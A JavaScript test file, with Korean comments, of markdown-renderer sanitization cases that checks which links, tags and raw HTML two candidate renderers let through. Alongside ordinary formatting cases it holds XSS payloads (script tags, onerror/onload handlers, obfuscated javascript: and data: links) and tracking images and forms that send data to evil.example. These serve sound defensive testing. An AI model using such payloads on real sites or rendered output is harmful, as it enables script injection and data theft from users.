// 렌더 프로브의 입력. `must` 는 제한을 건 컴포넌트가 지켜야 하는 것(어기면 그 사례의 실패), `watch` 는 판정 없이
// 적어 두는 관찰이다(표현이 어떻게 바뀌는지). 두 후보에 같은 기대를 건다.
//
// r 의 모양(render.mjs 의 analyze): { tags: {이름: 개수}, anchors: [{href,target,rel,text}], text, attrs: [{tag,name,value}] }

const count = (r, tag) => r.tags[tag] ?? 0;

/** 원시 HTML 이 글자로 보이는가. 보이면 "shown", 사라졌으면 "dropped", 일부만 남았으면 "partial". */
function rawShown(r, raw) {
  if (r.text.includes(raw)) return "shown";
  return r.text.trim() === "" ? "dropped" : "partial";
}

function noAnchors(r) {
  return r.anchors.length === 0 ? [] : [`링크가 그려졌다: ${JSON.stringify(r.anchors)}`];
}

function exactly(r, wanted) {
  return Object.entries(wanted)
    .filter(([tag, n]) => count(r, tag) !== n)
    .map(([tag, n]) => `<${tag}> ${n}개를 기대했는데 ${count(r, tag)}개다`);
}

function includes(r, piece) {
  return r.text.includes(piece) ? [] : [`글에 ${JSON.stringify(piece)} 가 없다`];
}

function softBreak(r, first, second) {
  if (r.text.includes(`${first}\n${second}`)) return "newline-in-text";
  if (count(r, "br") > 0) return "br";
  return r.text.includes(`${first} ${second}`) ? "space" : "lost";
}

const TABLE = ["| 조문 | 내용 |", "|---|---|", "| 제750조 | 불법행위 |", "| 제751조 | 재산 이외의 손해 |"].join(
  "\n",
);
const FENCE = "```";

export const CASES = [
  // ── 요청이 적은 열한 가지 ──────────────────────────────────────────────────────────────────────────────
  {
    id: "r01-raw-img",
    group: "required",
    input: "<img src=x onerror=alert(1)>",
    must: () => [],
    watch: (r) => ({ raw: rawShown(r, "<img src=x onerror=alert(1)>") }),
  },
  {
    id: "r02-raw-script",
    group: "required",
    input: "<script>alert(1)</script>",
    must: () => [],
    watch: (r) => ({ raw: rawShown(r, "<script>alert(1)</script>") }),
  },
  {
    id: "r03-js-link",
    group: "required",
    input: "[클릭](javascript:alert(1))",
    must: (r) => [...noAnchors(r), ...includes(r, "클릭")],
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "r04-data-link",
    group: "required",
    input: "[클릭](data:text/html,<script>alert(1)</script>)",
    must: (r) => [...noAnchors(r), ...includes(r, "클릭")],
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "r04b-data-link-base64",
    group: "required",
    input: "[클릭](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    must: (r) => [...noAnchors(r), ...includes(r, "클릭")],
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "r05-tracking-image",
    group: "required",
    input: "![추적](https://evil.example/p.png?q=secret)",
    must: (r) => noAnchors(r),
    watch: (r) => ({ text: r.text, urlInText: r.text.includes("evil.example") }),
  },
  {
    id: "r06-normal-link",
    group: "required",
    input: "[정상](https://www.law.go.kr/)",
    must: (r) =>
      r.anchors.length === 1 && r.anchors[0].href === "https://www.law.go.kr/" && r.anchors[0].text === "정상"
        ? []
        : [`링크 하나(https://www.law.go.kr/, "정상")를 기대했다: ${JSON.stringify(r.anchors)}`],
    watch: () => ({}),
  },
  {
    id: "r07-gfm-table",
    group: "required",
    input: TABLE,
    must: (r) => exactly(r, { table: 1, thead: 1, tbody: 1, tr: 3, th: 2, td: 4 }),
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "r08-ordered-list",
    group: "required",
    input: "1. 첫째\n2. 둘째\n3. 셋째",
    must: (r) => exactly(r, { ol: 1, li: 3 }),
    watch: () => ({}),
  },
  {
    id: "r09-code-block",
    group: "required",
    input: `${FENCE}python\nprint("<b>hi</b>")\nx = 1 * 2 * 3\n${FENCE}`,
    must: (r) => [
      ...exactly(r, { pre: 1, code: 1 }),
      ...includes(r, 'print("<b>hi</b>")\nx = 1 * 2 * 3'),
    ],
    watch: (r) => ({ classes: r.attrs.filter((a) => a.name === "class").map((a) => a.value) }),
  },
  {
    id: "r10-korean-bold-footnote",
    group: "required",
    input: "이 조항에서 **굵게** 적은 부분이 요건입니다[1].",
    must: (r) => [...exactly(r, { strong: 1 }), ...includes(r, "[1]"), ...includes(r, "굵게")],
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "r11-plain-single",
    group: "required",
    input: "4",
    must: (r) => (r.text === "4" ? [] : [`글이 "4" 가 아니다: ${JSON.stringify(r.text)}`]),
    watch: (r) => ({ wrappedIn: Object.keys(r.tags).filter((t) => t !== "div") }),
  },
  {
    id: "r11b-plain-multiline",
    group: "required",
    input: "첫째 줄\n둘째 줄\n\n셋째 줄",
    must: (r) => [...includes(r, "첫째 줄"), ...includes(r, "둘째 줄"), ...includes(r, "셋째 줄")],
    watch: (r) => ({
      softBreak: softBreak(r, "첫째 줄", "둘째 줄"),
      paragraphs: count(r, "p"),
      br: count(r, "br"),
    }),
  },

  // ── 더 본 것: 마크다운이 아닌 글이 망가지는가 ──────────────────────────────────────────────────────────
  {
    id: "x01-plain-asterisks",
    group: "plain",
    input: "2*3*4 = 24",
    must: () => [],
    watch: (r) => ({ kept: r.text === "2*3*4 = 24", text: r.text, em: count(r, "em") }),
  },
  {
    id: "x02-plain-underscores",
    group: "plain",
    input: "snake_case_name 과 __init__.py",
    must: () => [],
    watch: (r) => ({ kept: r.text === "snake_case_name 과 __init__.py", text: r.text }),
  },
  {
    id: "x03-plain-angle",
    group: "plain",
    input: "a < b 이고 List<String> 은 b > c",
    must: () => [],
    watch: (r) => ({ kept: r.text === "a < b 이고 List<String> 은 b > c", text: r.text }),
  },
  {
    id: "x04-plain-leading-markers",
    group: "plain",
    input: "# 은 주석 기호다\n1. 은 번호다\n- 3 은 음수다\n    네 칸 들여쓴 줄",
    must: () => [],
    watch: (r) => ({
      tags: Object.keys(r.tags).filter((t) => t !== "div"),
      text: r.text,
    }),
  },
  {
    id: "x05-html-entities",
    group: "plain",
    input: "&lt;script&gt; &amp; &copy; &#x3C;b&#x3E;",
    must: () => [],
    watch: (r) => ({ text: r.text }),
  },

  {
    id: "x06-plain-frontmatter-like",
    group: "plain",
    input: "---\n제목: 안내\n---\n본문입니다",
    must: (r) => [...includes(r, "제목: 안내"), ...includes(r, "본문입니다")],
    watch: (r) => ({ tags: Object.keys(r.tags).filter((t) => t !== "div"), text: r.text }),
  },

  // ── 더 본 것: 한국어와 출처 표기 ───────────────────────────────────────────────────────────────────────
  {
    id: "x10-korean-flanking-paren",
    group: "korean",
    input: "**민법 제750조(불법행위)**는 고의 또는 과실을 요건으로 합니다.",
    must: () => [],
    watch: (r) => ({ strong: count(r, "strong"), literalStars: r.text.includes("**"), text: r.text }),
  },
  {
    id: "x11-korean-flanking-quote",
    group: "korean",
    input: '여기서 **"손해"**란 재산의 손해를 말합니다.',
    must: () => [],
    watch: (r) => ({ strong: count(r, "strong"), literalStars: r.text.includes("**"), text: r.text }),
  },
  {
    id: "x12-korean-bold-particle",
    group: "korean",
    input: "**굵게**입니다. *기울임*도 됩니다.",
    must: () => [],
    watch: (r) => ({ strong: count(r, "strong"), em: count(r, "em"), text: r.text }),
  },
  {
    id: "x13-ref-definition",
    group: "korean",
    input: "판례에 따르면 그렇습니다[1].\n\n[1]: https://www.law.go.kr/",
    must: () => [],
    watch: (r) => ({ markerKept: r.text.includes("[1]"), anchors: r.anchors, text: r.text }),
  },
  {
    id: "x14-source-list",
    group: "korean",
    input: [
      "가능합니다[1][2].",
      "",
      "출처",
      "[1] 민법 제750조 (갱신 2026-01-02) https://www.law.go.kr/법령/민법",
      "[2] 안내문 <https://www.law.go.kr/>",
    ].join("\n"),
    must: (r) => [...includes(r, "[1][2]"), ...includes(r, "[1] 민법"), ...includes(r, "[2] 안내문")],
    watch: (r) => ({ softBreak: softBreak(r, "출처", "[1] 민법"), anchors: r.anchors }),
  },
  {
    id: "x15-footnote-gfm",
    group: "korean",
    input: "본문입니다[^1].\n\n[^1]: 각주의 글입니다.",
    must: () => [],
    watch: (r) => ({
      tags: Object.keys(r.tags).filter((t) => t !== "div"),
      anchors: r.anchors,
      ids: r.attrs.filter((a) => a.name === "id").map((a) => a.value),
      text: r.text,
    }),
  },

  // ── 더 본 것: 자동 링크와 주소 ─────────────────────────────────────────────────────────────────────────
  {
    id: "x20-autolink-bare",
    group: "links",
    input: "https://www.law.go.kr/법령/민법 을 보세요. www.law.go.kr 도 같습니다. 문의는 help@example.com",
    must: (r) => includes(r, "help@example.com"),
    watch: (r) => ({ anchors: r.anchors }),
  },
  {
    id: "x21-autolink-angle-js",
    group: "links",
    input: "<javascript:alert(1)> 와 <mailto:a@example.com>",
    must: (r) => noAnchors(r),
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "x22-js-case",
    group: "links",
    input: "[a](JaVaScRiPt:alert(1))",
    must: (r) => noAnchors(r),
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "x23-js-entity",
    group: "links",
    input: "[a](&#106;avascript:alert(1)) [b](javascript&colon;alert(1)) [c](&#x6A;avascript&#58;alert(1))",
    must: (r) => noAnchors(r),
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "x24-js-whitespace",
    group: "links",
    input: "[a](<java\tscript:alert(1)>) [b](<  javascript:alert(1)>) [c](<\u0001javascript:alert(1)>)",
    must: (r) => noAnchors(r),
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "x25-other-schemes",
    group: "links",
    input: [
      "[a](vbscript:msgbox(1))",
      "[b](file:///C:/Windows/win.ini)",
      "[c](mailto:a@example.com)",
      "[d](tel:+82-2-0000-0000)",
      "[e](blob:https://evil.example/1)",
      "[f](ftp://evil.example/)",
    ].join(" "),
    must: (r) => noAnchors(r),
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "x26-relative-links",
    group: "links",
    input: "[a](/admin) [b](//evil.example/x) [c](#frag) [d](?q=1) [e](evil.example)",
    must: (r) => noAnchors(r),
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "x27-link-title-and-encoding",
    group: "links",
    input: '[법](https://www.law.go.kr/법령/민법?a=1&b=2#제750조 "제목")',
    must: (r) => (r.anchors.length === 1 ? [] : [`링크 하나를 기대했다: ${JSON.stringify(r.anchors)}`]),
    watch: (r) => ({
      href: r.anchors[0]?.href,
      title: r.attrs.filter((a) => a.name === "title").map((a) => a.value),
    }),
  },
  {
    id: "x28-link-userinfo",
    group: "links",
    input: "[은행](https://www.law.go.kr@evil.example/login)",
    must: () => [],
    watch: (r) => ({ anchors: r.anchors }),
  },

  // ── 더 본 것: 원시 HTML 의 다른 모양 ───────────────────────────────────────────────────────────────────
  {
    id: "x30-raw-anchor-js",
    group: "raw-html",
    input: '<a href="javascript:alert(1)">링크</a>',
    must: (r) => noAnchors(r),
    watch: (r) => ({ raw: rawShown(r, '<a href="javascript:alert(1)">링크</a>'), text: r.text }),
  },
  {
    id: "x31-raw-iframe",
    group: "raw-html",
    input: '<iframe src="https://evil.example/"></iframe>',
    must: () => [],
    watch: (r) => ({ raw: rawShown(r, '<iframe src="https://evil.example/"></iframe>') }),
  },
  {
    id: "x32-raw-svg",
    group: "raw-html",
    input: "<svg onload=alert(1)></svg>",
    must: () => [],
    watch: (r) => ({ raw: rawShown(r, "<svg onload=alert(1)></svg>") }),
  },
  {
    id: "x33-raw-style",
    group: "raw-html",
    input: "<style>*{display:none}</style>\n\n보이는 글",
    must: (r) => includes(r, "보이는 글"),
    watch: (r) => ({ raw: rawShown(r, "<style>*{display:none}</style>") }),
  },
  {
    id: "x34-raw-block-div",
    group: "raw-html",
    input: '<div onclick="alert(1)">\n\n**블록**\n\n</div>\n\n다음 문단',
    must: (r) => includes(r, "다음 문단"),
    watch: (r) => ({ text: r.text, strong: count(r, "strong") }),
  },
  {
    id: "x35-raw-comment",
    group: "raw-html",
    input: "앞 <!-- 주석 --> 뒤",
    must: (r) => [...includes(r, "앞"), ...includes(r, "뒤")],
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "x36-raw-inline-mixed",
    group: "raw-html",
    input: "<b>굵게</b>와 **굵게** 그리고 <br> 과 <input type=checkbox checked>",
    must: (r) => exactly(r, { b: 0, strong: 1 }),
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "x37-raw-details-form",
    group: "raw-html",
    input:
      '<details open><summary>열기</summary><form action="https://evil.example/"><button formaction="javascript:alert(1)">전송</button></form></details>',
    must: () => [],
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "x38-raw-unclosed",
    group: "raw-html",
    input: '<img src="https://evil.example/p.png"\n\n다음 문단 <script',
    must: (r) => includes(r, "다음 문단"),
    watch: (r) => ({ text: r.text }),
  },

  // ── 더 본 것: 이미지의 다른 모양 ───────────────────────────────────────────────────────────────────────
  {
    id: "x40-image-in-link",
    group: "images",
    input: "[![추적](https://evil.example/p.png)](https://www.law.go.kr/)",
    must: (r) =>
      r.anchors.length === 1 && r.anchors[0].href === "https://www.law.go.kr/"
        ? []
        : [`링크 하나를 기대했다: ${JSON.stringify(r.anchors)}`],
    watch: (r) => ({ anchorText: r.anchors[0]?.text }),
  },
  {
    id: "x41-image-reference",
    group: "images",
    input: "![추적][img]\n\n[img]: https://evil.example/p.png",
    must: () => [],
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "x42-image-title-no-alt",
    group: "images",
    input: '![](https://evil.example/p.png "제목") 뒤의 글',
    must: (r) => includes(r, "뒤의 글"),
    watch: (r) => ({ text: r.text }),
  },

  // ── 더 본 것: GFM 의 나머지 ────────────────────────────────────────────────────────────────────────────
  {
    id: "x50-task-list",
    group: "gfm",
    input: "- [ ] 할 일\n- [x] 한 일",
    must: (r) => exactly(r, { ul: 1, li: 2 }),
    watch: (r) => ({ text: r.text, classes: r.attrs.filter((a) => a.name === "class").map((a) => a.value) }),
  },
  {
    id: "x51-table-align",
    group: "gfm",
    input: "| 왼 | 가운데 | 오 |\n|:--|:-:|--:|\n| a | b | c |",
    must: (r) => exactly(r, { table: 1, th: 3, td: 3 }),
    watch: (r) => ({
      alignAttrs: r.attrs
        .filter((a) => a.name === "style" || a.name === "align")
        .map((a) => `${a.tag}[${a.name}=${a.value}]`),
    }),
  },
  {
    id: "x52-table-inline",
    group: "gfm",
    input:
      "| 조문 | 링크 |\n|---|---|\n| **제750조** | [법](https://www.law.go.kr/) |\n| `a\\|b` | ![x](https://evil.example/p.png) |",
    must: (r) => [...exactly(r, { table: 1, strong: 1, td: 4 }), ...(r.anchors.length === 1 ? [] : ["링크 하나를 기대했다"])],
    watch: (r) => ({ text: r.text }),
  },
  {
    id: "x53-blocks",
    group: "gfm",
    input: "# 제목\n\n## 소제목\n\n> 인용\n\n---\n\n~~취소~~ `코드`\n\n- 가\n  - 나\n    1. 다",
    must: (r) =>
      exactly(r, { h1: 1, h2: 1, blockquote: 1, hr: 1, del: 1, code: 1, ul: 2, ol: 1, li: 3 }),
    watch: (r) => ({ ids: r.attrs.filter((a) => a.name === "id").map((a) => a.value) }),
  },
  {
    id: "x54-hard-break",
    group: "gfm",
    input: "두 칸으로 끝난 줄  \n다음 줄\\\n셋째 줄",
    must: () => [],
    watch: (r) => ({ br: count(r, "br"), text: r.text }),
  },
  {
    id: "x55-inline-code-html",
    group: "gfm",
    input: "인라인 `<script>alert(1)</script>` 과 `**별**`",
    must: (r) => [...includes(r, "<script>alert(1)</script>"), ...includes(r, "**별**")],
    watch: () => ({}),
  },
];
